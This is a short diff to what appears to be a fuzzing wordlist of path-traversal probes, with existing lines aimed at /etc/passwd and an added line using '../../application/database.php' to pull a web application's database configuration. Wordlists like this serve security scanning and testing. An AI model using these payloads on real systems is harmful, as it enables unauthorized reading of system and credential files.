@@ -17,3 +17,4 @@
 /000~ROOT~000/etc/passwd
 /OLDS/home/000~ROOT~000/etc/passwd
 /app/webroot/files/kcfinder/files/home/000~ROOT~000/etc/passwd
+/index/download/index?name=index.php&url=../../application/database.php
